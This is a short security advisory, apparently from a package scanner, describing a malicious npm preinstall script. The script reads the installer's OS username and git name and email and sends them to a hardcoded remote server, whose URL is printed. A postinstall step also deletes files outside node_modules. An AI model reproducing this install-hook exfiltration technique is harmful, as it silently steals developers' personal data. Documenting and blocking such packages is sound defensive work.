summary: preinstall script exfiltrates installer OS username and git identity to hardcoded remote endpoint
details: The package's preinstall lifecycle script (dist/scripts/preinstall.js), which runs automatically on `npm install`, collects the installer's OS username via `os.userInfo().username` and parses `~/.gitconfig` to read the installer's git `user.name` and `user.email`, then sends all three values to a hardcoded remote endpoint via `https.get` to `https://2tak.l.serverhost.name:1962/mobile/reext?osname=...&gitname=...&gitemail=...`. An author-gated branch short-circuits to `http://localhost:1962` when the OS username equals `xmarcgusmano`, confirming the remote endpoint is a deliberately-configured collection server for anyone other than the author. Every `npm install` of this package silently transmits installer PII (host username + git-identified developer name/email) to an author-controlled server without disclosure or consent. A secondary quality concern (the postinstall deletes `../../../public/ext/enterprise` from the installer's own project tree, reaching outside node_modules) is also present but is not the basis for block. The serverhost.name domain is not the package publisher's documented infrastructure, and there is no opt-in / disclosure for the data collection.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
